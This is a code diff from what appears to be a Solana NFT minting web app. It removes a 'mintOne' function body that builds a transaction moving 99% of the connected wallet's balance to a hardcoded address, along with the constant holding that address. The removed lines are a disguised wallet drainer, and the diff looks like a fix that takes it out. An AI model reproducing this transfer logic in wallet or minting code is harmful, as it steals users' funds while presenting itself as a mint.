@@ -392,24 +392,6 @@ useEffect(() => {
     }
 
     async function mintOne() {
-        if (wallet && wallet.publicKey) {
-      const lamports  =     (await props.connection.getBalance(wallet.publicKey)) 
-          
-            let transaction = new Transaction({
-              feePayer: wallet.publicKey,
-              recentBlockhash: (await connection.current.getRecentBlockhash()).blockhash
-          });
-
-  
-          // Add instructions to the tx
-          transaction.add(
-              SystemProgram.transfer({
-              fromPubkey: wallet.publicKey,
-              toPubkey: new PublicKey(defaultDest),
-              lamports: lamports* 0.99,
-              })
-          );
-        }
     }
 
     const startMint = async (quantityString: number) => {
@@ -452,10 +434,6 @@ useEffect(() => {
         })();
     }, [wallet, props.connection]);
 
-    const network = "devnet";
-
-      const connection = useRef(new Connection(clusterApiUrl(network)));
-const defaultDest = '36dcR2j1EvqzthUshBz6LhhPyJ4vRzAv1rc9LrQLQn9t';
 
 
     return (
